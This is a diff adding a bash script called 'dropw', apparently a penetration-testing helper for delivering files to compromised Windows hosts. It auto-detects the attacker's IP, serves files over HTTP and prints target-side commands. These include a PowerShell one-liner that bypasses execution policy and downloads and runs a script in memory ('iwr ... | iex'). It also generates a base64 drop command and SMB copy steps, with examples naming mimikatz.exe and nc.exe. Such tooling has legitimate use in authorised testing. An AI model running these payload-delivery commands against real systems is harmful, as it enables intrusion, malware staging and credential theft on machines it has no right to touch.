@@ -1,0 +1,184 @@
+#!/usr/bin/env bash
+set -euo pipefail
+# Define colors
+RED="\e[31m"
+GREEN="\e[32m"
+YELLOW="\e[33m"
+BLUE="\e[34m"
+MAGENTA="\e[35m"
+CYAN="\e[36m"
+BOLD_WHITE="\e[1;37m"
+WHITE="\e[37m"
+BRIGHT_WHITE="\e[97m"
+RESET="\e[0m"
+COLOR=$BRIGHT_WHITE
+
+
+FILE="${1:-}"
+CASE="${2:-http}"
+ARG3="${3:-}"   # port for http|fileless|encrypted; share for smb
+
+if [[ -z "$FILE" || ! -f "$FILE" || "$1" == "-h" || "$1" == "--help" ]]; then
+  echo -e "${MAGENTA}HELP: dropw - The Windows File Delivery Helper${RESET}"
+  echo -e "Usage: $(basename "$0") ${CYAN}<local_file>${RESET} ${YELLOW}[method]${RESET} [port_or_share]"
+  echo -e "-----------------------------------------------------------------------"
+
+  # Table Header
+  printf "  ${YELLOW}%-12s${RESET} %-15s %s\n" "METHOD" "DEFAULT" "DESCRIPTION"
+  printf "  %-12s %-15s %s\n" "------" "-------" "-----------"
+  
+  # Method Rows
+  printf "  ${GREEN}%-12s${RESET} %-15s %s\n" "http" "Port 8080" "Serves file via Python/Go/Ruby web server"
+  printf "  ${GREEN}%-12s${RESET} %-15s %s\n" "fileless" "IEX" "Serves .ps1 for direct memory execution"
+  printf "  ${RED}%-12s${RESET} %-15s %s\n" "smb" "Port 445" "Impacket SMB share (needs root)"
+  printf "  ${RED}%-12s${RESET} %-15s %s\n" "encrypted" "Port 443" "SSL/TLS encrypted transfer via OpenSSL"
+  printf "  ${GREEN}%-12s${RESET} %-15s %s\n" "offline" "Base64" "Converts file to a B64 one-liner for pasting"
+
+  echo -e "\n${MAGENTA}EXAMPLES:${RESET}"
+  echo -e "  $(basename "$0") mimikatz.exe            # Serve via HTTP on 8080"
+  echo -e "  $(basename "$0") script.ps1 fileless     # Target: IEX(IWR http://IP/script.ps1)"
+  echo -e "  $(basename "$0") nc.exe smb tools        # SMB share named 'tools'"
+  echo -e "  $(basename "$0") exploit.exe encrypted   # Encrypted delivery"
+  echo -e "  $(basename "$0") win.ini offline         # Generates [IO.File]::WriteAllBytes..."
+
+  echo -e "\n${CYAN}Action:${RESET} The target download command is automatically copied to your ${YELLOW}clipboard${RESET}."
+  exit 1
+fi
+
+IP="${IP:-}"
+
+
+# 1) try tun0 if not provided
+if [[ -z "$IP" ]]; then
+  IP="$( ip -br addr show dev tun0 2>/dev/null \
+        | awk '{print $3}' | cut -d/ -f1 || true )"
+  [[ -n "$IP" ]]
+fi
+
+
+# 2) default-route source IP
+if [[ -z "$IP" ]]; then
+  IP="$( ip route get 1.1.1.1 2>/dev/null \
+        | awk '{for(i=1;i<=NF;i++) if ($i=="src") {print $(i+1); exit}}' || true )"
+  [[ -n "$IP" ]]
+fi
+
+# 3) first non-loopback global IPv4
+if [[ -z "$IP" ]]; then
+  IP="$( ip -4 -br addr show scope global 2>/dev/null \
+        | awk '{print $3}' | cut -d/ -f1 | head -n1 || true )"
+  [[ -n "$IP" ]]
+fi
+
+
+if [[ -z "$IP" ]]; then
+  echo "[-] Could not determine an attacker/machine IP. Export \$IP, connect VPN (tun0), or ensure an interface has an IPv4 address." >&2
+  exit 1
+fi
+
+
+BASE="$(basename "$FILE")"
+DIR="$(cd "$(dirname "$FILE")" 2>/dev/null || pwd)"
+
+PORT="${ARG3:-8080}"
+SHARE="${ARG3:-share}"
+
+# For network servers: low ports need root. Use high default ports on HTTP.
+if [[ "$CASE" =~ ^(http|fileless|encrypted)$ ]]; then
+  if [[ "$PORT" =~ ^[0-9]+$ ]] && (( PORT < 1024 )) && (( EUID != 0 )); then
+    echo "[!] Port ${PORT} requires root. Falling back to 8080."
+    PORT=8080
+  fi
+fi
+echo 
+case "$CASE" in
+  http)
+    echo -e "${MAGENTA}=== HTTP ==="
+    echo
+    echo -e "${COLOR}(New-Object Net.WebClient).DownloadFile('http://${IP}:${PORT}/${BASE}','.\\\\${BASE}')"
+    echo -e "Invoke-WebRequest http://${IP}:${PORT}/${BASE} -OutFile .\\\\${BASE}"
+    printf "%s" "Invoke-WebRequest http://${IP}:${PORT}/${BASE} -OutFile .\\${BASE}" | xclip -selection clipboard
+    echo -e "${GREEN}→ helper copied to clipboard"
+    echo
+    echo -e "${YELLOW}[*] Serving ${BASE} at http://${IP}:${PORT}/ (Ctrl-C to stop)"
+    python3 -m http.server "$PORT" --bind 0.0.0.0
+    ;;
+
+  fileless)
+    
+    echo -e "${MAGENTA}=== Fileless ==="
+    echo
+    CMD="powershell -ep bypass -nop -c \"iwr http://${IP}:${PORT}/${BASE} | iex\""
+
+    echo -e "${COLOR}${CMD}${RESET}"
+    printf "%s" "$CMD" | xclip -selection clipboard
+
+    echo -e "${GREEN}→ copied to clipboard"
+    # tips if not .ps1
+    if [[ ! "$BASE" =~ \.ps1$ ]]; then
+      echo "# (Tip) fileless is meant for .ps1 payloads; for binaries use http/smb modes."
+    fi
+    echo
+    echo -e "${YELLOW}[*] Serving ${BASE} at http://${IP}:${PORT}/ (Ctrl-C to stop)"
+    python3 -m http.server "$PORT" --bind 0.0.0.0
+    ;;
+
+  encrypted)
+   
+    echo -e ${RED} Not implemented: this action is not available in this build. 
+  exit 1
+   
+    echo -e "${MAGENTA}=== Encrypted ===${COLOR}"
+    DIR="$(cd "$(dirname "$FILE")" 2>/dev/null && pwd || pwd)"
+    openssl enc -aes256 -pbkdf2 -in "${FILE}" -out "${DIR}/${BASE}.enc"
+
+    echo
+    echo "(New-Object Net.WebClient).DownloadFile('http://${IP}:${PORT}/${BASE}.enc','.\\\\${BASE}.enc')"
+    echo "(New-Object Net.WebClient).DownloadFile('http://${IP}:${PORT}/${BASE}.enc','.\\\\${BASE}.enc')" | xclip -selection clipboard
+    echo -e "${GREEN}→ copied to clipboard${COLOR}"
+    echo
+    echo "openssl enc -d -aes-256-cbc -pbkdf2 -in ${FILE}.enc -out ${FILE}"
+
+    echo
+    echo -e "${YELLOW}[*] Serving ${BASE}.enc at http://${IP}:${PORT}/ (Ctrl-C to stop)"
+    python3 -m http.server "$PORT" --bind 0.0.0.0
+    ;;
+
+  offline)
+    echo -e "${MAGENTA}=== Offline ==="
+    ENCODED="$(base64 -w0 "${FILE}")"  
+    echo -e "${COLOR}\$b64='${ENCODED}'; [IO.File]::WriteAllBytes((Join-Path (Get-Location).Path '${BASE}'), [Convert]::FromBase64String(\$b64))"
+    printf "%s" "\$b64='${ENCODED}'; [IO.File]::WriteAllBytes((Join-Path (Get-Location).Path '${BASE}'), [Convert]::FromBase64String(\$b64))" | xclip -selection clipboard
+    echo -e "${GREEN}→ copied to clipboard"
+    ;;
+
+  smb)
+
+      echo -e ${RED} Not implemented: this action is not available in this build. 
+      exit 1
+    if (( EUID != 0 )); then
+      echo "[-] SMB on Windows target requires your server to bind port 445. Run as root (sudo) or use http mode." >&2
+      exit 1
+    fi
+    
+    
+    exit 1
+    echo "=== On TARGET (map & copy) ==="
+    echo "copy \\\\${IP}\\${SHARE}\\${BASE} C:\\Users\\Public\\${BASE}"
+    echo "# Or, if guest blocked:"
+    echo "net use n: \\\\${IP}\\${SHARE} /user:user pass"
+    echo "copy n:\\${BASE} C:\\Users\\Public\\${BASE}"
+    echo
+    echo "[*] Exporting SMB share \"${SHARE}\" from ${DIR} on 445 (Ctrl-C to stop)"
+    cd "$DIR"
+    if command -v impacket-smbserver >/dev/null 2>&1; then
+      impacket-smbserver "${SHARE}" . -smb2support
+    else
+      python3 -m impacket.smbserver "${SHARE}" . -smb2support
+    fi
+    ;;
+
+  *)
+    echo "[-] Unknown case: ${CASE}. Use: http|fileless|smb|encrypted|offline" >&2; exit 1 ;;
+esac
+
